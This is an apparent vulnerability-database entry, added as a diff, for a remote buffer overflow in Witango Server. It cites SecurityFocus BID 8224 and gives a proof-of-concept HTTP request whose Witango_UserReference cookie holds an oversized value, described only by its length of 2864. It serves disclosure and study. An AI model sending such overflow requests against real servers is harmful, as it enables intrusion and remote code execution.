@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/8224/info
+
+Witango Server is prone to a remote buffer overflow vulnerability. Remote users may be able to send an HTTP request to a Witango server with a cookie containing a specific variable set to an excessively large value. Remote code execution is possible.
+
+GET /ngssoftware.tml HTTP/1.1
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg,
+application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword,
+application/x-shockwave-flash, */*
+Accept-Language: en-gb
+User-Agent: My Browser
+Host: ngssoftware.com
+Connection: Keep-Alive
+Cookie: Witango_UserReference= parameter length 2864
